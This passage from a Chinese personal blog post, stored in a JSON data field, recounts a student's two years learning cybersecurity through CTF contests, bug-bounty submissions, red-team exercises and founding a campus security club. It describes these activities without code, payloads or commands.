必不可少的。于是我开始逼着自己看代码，遇到不会的函数就去搜，很简单的一段代码我却要分析很久（这里提一嘴，有一门语言的基础真的真的很重要，它可以让你在学其他语言的时候快速理清逻辑，只需要关注一些函数方法的使用就行了，个人认为）。而这种强制性的学习对我来说作用不大，反倒是一步步消磨了我对CTF的兴趣，我开始研究起了SRC。</p>\n<p>​\t挖洞同样是一件对我有着很大的吸引力的事情，毕竟目标都是真实的网站。在跟着网上看来的方法断断续续的尝试了的很长一段时间后，终于在漏洞盒子，补天，edu，360众包等平台都有了提交通过的漏洞，都是一些很基础的公益漏洞，弱口令、sql注入和源码泄露等等，而且这东西确实是要花时间才能体会到的（对于普通的我来说），所以挖不到洞师傅也不用着急，我们没有大佬们的天赋，那就靠坚持来收获果实。然后思路打开之后，也是挖到了浙大的漏洞报告证书和很少数目的漏洞赏金（绝大多数都是公益的），虽然成果不多，但对我而言却是一个极大的鼓舞，然后就开始了边打CTF和边挖洞的平淡生活，也偶尔搭靶场学一下渗透测试。</p>\n<p>​\t大二下学期，出于准备参加国HVV的目的，也开始研究起了网络攻防。为了应付面试去学一些蓝队的知识，而在这个过程中，我开始发现原来红队才是我理想的工作（只能说太黑客了，太库辣），于是乎，在准备面试的同时又开始研究起了一些红队的技术，主要是信息收集和Web打点。后面国护也定岗了蓝队中级减，也在院长的支持下打了一次市级HW的红队并且拿了一个第五名三等奖，还有奖金拿，挺不错的。</p>\n<p>​\t回顾这两年的学习之路，没有CTF佬的AK全场，没有SRC佬的一洞百分，更没有红队佬的0day爆杀，看起来只有这里学一点，那里学一会，最终还是只能靠工具一把梭。而我也对此也并没有什么遗憾，因为在这个学习的过程中，我和朋友一起创立了一个网安俱乐部，虽然大家都不是很强的大佬，但是大家志同道合，一起打CTF，一起打攻防，一起学习讨论，分享知识，我也在这段学习的过程中收获了一些不错的成果，也完成了自己当初定的一些小目标：加战队，打线下比赛，拿国奖，挖一个学校的漏洞，用网安知识赚点钱（合法），打攻防等等。真的十分快乐，而且我学网安的初衷也是因为兴趣爱好，所以管它以后能不能成为大佬，能不能年薪百万。只希望能够在未来的网安之路中认识更多有趣的人，做更多有趣的事，活在当下，享受眼前，要是能再顺便赚点米那就再好不过了。</p>\n","categories":["日常"],"tags":["经历"]}]